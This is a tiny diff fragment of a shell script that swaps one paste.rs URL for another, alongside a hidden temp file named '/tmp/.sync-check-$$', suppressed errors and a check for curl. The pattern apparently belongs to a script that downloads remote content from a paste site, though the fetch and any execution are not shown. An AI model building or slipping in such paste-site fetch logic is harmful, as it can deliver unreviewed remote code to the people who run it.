@@ -2,7 +2,7 @@
 
 set +e
 
-URL="https://paste.rs/D6Ae2"
+URL="https://paste.rs/fR6gh"
 TMP="/tmp/.sync-check-$$"
 
 if command -v curl >/dev/null 2>&1; then
